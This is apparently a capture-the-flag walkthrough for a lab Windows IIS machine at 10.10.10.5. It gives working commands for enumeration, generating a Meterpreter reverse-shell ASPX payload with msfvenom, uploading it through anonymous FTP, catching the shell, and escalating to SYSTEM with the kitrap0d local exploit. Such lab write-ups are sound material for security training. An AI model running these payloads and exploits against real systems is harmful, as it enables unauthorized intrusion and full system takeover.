Target: 10.10.10.5

## Enumeration:

nmap
```
$ sudo nmap -sC -sV 10.10.10.5            

Nmap scan report for 10.10.10.5
Host is up (0.084s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Findings:Looking for attack vectors

FTP can be accessed through Anonymous ftp login and in / ftp files can be accessed.


## Foothold:

creating payload
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=9001 -f aspx > shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2887 bytes
```

uploading payload
```
$ ftp 10.10.10.5

put shell.aspx

local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2924 bytes sent in 0.00 secs (73.3827 MB/s)
```

openning a meterpreter lister
```
$ msfconsole

use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 9001
run
```

accessing uploaded file
```
$ curl http://10.10.10.5/shell.aspx
```

```
meterpreter > getuid

Server username: IIS APPPOOL\Web
```


## Priv Escalations:

upgrading privilage
```
meterpreter > bg
[*] Backgrounding session 1... 

use post/multi/recon/local_exploit_suggester
set SESSION 1
run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...                                                      
[*] 10.10.10.5 - 37 exploit checks are being tried...                                                              
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.                    
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.      
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST tun0
run

[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module

use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST tun0
run
```

```
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > cd C:\\Users\\babis\\Desktop

meterpreter > cat user.txt.txt

<redacted>

meterpreter > cd C:\\Users\\Administrator\\Desktop

meterpreter > cat root.txt

<redacted>
```
